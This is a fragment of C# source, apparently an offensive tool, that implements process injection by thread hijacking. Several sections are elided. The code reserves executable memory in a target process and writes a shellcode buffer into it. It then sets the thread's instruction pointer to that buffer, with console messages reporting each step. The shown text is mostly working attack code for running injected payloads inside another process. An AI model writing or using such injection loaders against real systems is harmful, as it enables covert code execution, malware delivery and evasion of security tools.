...
namespace Process_Injection___Thread_Hijack
{
    class Program
    {
        ...
        static void Main(string[] args)
        {
            ...
            */
            ...
            // Reserve Memory to allocate our shellcode
            //IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (addr == IntPtr.Zero)
            {
                Console.WriteLine("[-] VirtualAllocEx failed");
                return;
            }
            Console.WriteLine("[*] Reserved memory base address : {0}",addr);
            ...
            {
                Console.WriteLine("[*] Original thread RIP  : {0}", context.Rip);
            }
            else
            {
            ...
            //Fill the reserved memory with our sheellcode
            IntPtr outSize;
            bool res3 = WriteProcessMemory(pi.hProcess, addr, buf, buf.Length, out outSize);
            if (res3 == false)
            {
            ...
            context.Rip = (ulong)addr;

            if (SetThreadContext(pi.hThread, ref context))
            {
                Console.WriteLine("RIP  modified succesfully to : {0}", addr);
            }
            else
            {
